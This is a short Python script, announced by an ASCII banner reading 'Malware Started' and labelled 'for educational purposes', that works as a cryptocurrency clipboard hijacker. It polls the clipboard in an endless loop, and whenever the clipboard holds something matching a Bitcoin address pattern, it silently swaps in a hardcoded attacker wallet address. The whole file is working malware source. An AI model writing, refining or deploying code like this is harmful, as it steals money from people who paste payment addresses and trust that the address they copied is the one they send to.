#CODEAUTHOR : VJK
#ONLY FOR EDUCATIONAL PURPOSES <3
print("""
  __  __       _                           _____ _             _           _ 
 |  \/  |     | |                         / ____| |           | |         | |
 | \  / | __ _| |_      ____ _ _ __ ___  | (___ | |_ __ _ _ __| |_ ___  __| |
 | |\/| |/ _` | \ \ /\ / / _` | '__/ _ \  \___ \| __/ _` | '__| __/ _ \/ _` |
 | |  | | (_| | |\ V  V / (_| | | |  __/  ____) | || (_| | |  | ||  __/ (_| |
 |_|  |_|\__,_|_| \_/\_/ \__,_|_|  \___| |_____/ \__\__,_|_|   \__\___|\__,_|
                                                                             
                                                                             
""")
import re
import pyperclip
clipboarddata = ''
while 1 != 2:
    clipboarddata = pyperclip.paste()
    ourbtc = re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',clipboarddata)
    if (ourbtc):
        pyperclip.copy("bc1q0690ugz5umpwvw4ynaw22lw740ecgcwes4dyez ")
